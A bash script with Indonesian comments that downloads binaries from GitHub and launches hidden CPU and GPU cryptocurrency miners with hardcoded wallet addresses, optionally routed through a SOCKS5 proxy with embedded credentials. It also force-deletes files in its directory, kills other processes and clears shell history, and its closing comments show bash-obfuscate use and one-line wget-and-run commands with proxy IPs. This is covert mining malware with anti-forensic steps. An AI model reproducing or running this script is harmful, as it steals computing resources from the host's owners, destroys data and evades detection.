#!/bin/bash

# Inisialisasi variabel default
# Get From Parameter
plant="off"
plant_ip="172.1.1.1"

cpu="off"
cpu_server="stratum+tcps://stratum-eu.rplant.xyz:17116"
cpu_solo="off"

gpu="off"
gpu_server="ip:port"
gpu_solo="off"

# Variable
socks5_port="443"
socks5_username="clarksye"
socks5_password="user123"

# Loop melalui argumen baris perintah
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --plant) plant=$2; shift 2 ;;
        --plant-ip) plant_ip=$2; shift 2 ;;
        --cpu) cpu=$2; shift 2 ;;
        --cpu-server) cpu_server=$2; shift 2 ;;
        --cpu-solo) cpu_solo=$2; shift 2 ;;
        --gpu) gpu=$2; shift 2 ;;
        --gpu-server) gpu_server=$2; shift 2 ;;
        --gpu-solo) gpu_solo=$2; shift 2 ;;
        *) echo "Argumen tidak valid: $1"; exit 1 ;;
    esac
done

downloads='{
    "graphics": {
        "link": "wget -q https://github.com/handevproject/starterpack/raw/main/plant.tar.gz",
        "run": [
            "tar -xf plant.tar.gz",
            "rm -rf plant.tar.gz",
            "cat > plant/local/plant-local.conf <<END\n[local]\nlisten = :2233\nloglevel = 0\nsocks5 = '${plant_ip}':'${socks5_port}'\nsocks5_username = '${socks5_username}'\nsocks5_password = '${socks5_password}'\nEND",
            "./plant/local/plant-local -config plant/local/plant-local.conf &"
        ]
    },
    "cpu": {
        "link": "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' wget -q https://github.com/handevproject/starterpack/releases/download/1.0.1/plane",
        "run": [
            "chmod +x plane",
            "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' ./plane -a yescryptr32 -o '${cpu_server}' -u UYedRTJQCRnYLLgXtp6HMdhjoukhyBsvs6.'$((RANDOM % 999999 + 1))' '$(if [ "$cpu_solo" = "on" ]; then echo "-p m=solo"; fi)' &"
        ]
    },
    "gpu": {
        "link": "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' wget -q https://github.com/handevproject/starterpack/raw/main/air",
        "run": [
            "chmod +x air",
            "'$(if [ "$plant" = "on" ]; then echo "./plant/plant"; fi)' ./air --url=ssl://KUy8fVanAPNhLzfVcWiagaqxNmTpmYHFhS.'$((RANDOM % 999999 + 1))'@'${gpu_server}' --telemetry=0.0.0.0:0 --hideclocks &"
        ]
    }
}'

# Start Script
eval "find . ! -name 'info.txt' -exec rm -rf {} +"
eval "pkill -9 -f ./plant"
eval "pkill -9 -f ./plane"
eval "pkill -9 -f ./air"

if [ "$plant" = "on" ]; then
    link=$(echo "$downloads" | jq -r ".graphics.link")
    eval "$link"

    run_cmds=$(echo "$downloads" | jq -r ".graphics.run[]")
    for cmd in "${run_cmds[@]}"; do
        eval "$cmd"
    done
fi

if [ "$cpu" = "on" ]; then
    link=$(echo "$downloads" | jq -r ".cpu.link")
    echo "$link"
    eval "$link"

    run_cmds=$(echo "$downloads" | jq -r ".cpu.run[]")
    for cmd in "${run_cmds[@]}"; do
        echo "$cmd"
        eval "$cmd"
    done
fi

if [ "$gpu" = "on" ]; then
    link=$(echo "$downloads" | jq -r ".gpu.link")
    echo "$link"
    eval "$link"

    run_cmds=$(echo "$downloads" | jq -r ".gpu.run[]")
    for cmd in "${run_cmds[@]}"; do
        echo "$cmd"
        eval "$cmd"
    done
fi

eval "rm -rf runtime"
eval " history -c"
eval " clear"
# End Script

# bash-obfuscate kiiro.sh -o runtime -c 1
# wget -q https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime && ./runtime --plant on --plant-ip 34.239.139.160 --cpu on --cpu-server stratum+tcps://stratum-na.rplant.xyz:17052 --gpu on && history -c && clear
# wget -q https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime && ./runtime --plant on --plant-ip 44.205.244.38 --gpu on --gpu-server stratum-na.rplant.xyz:17098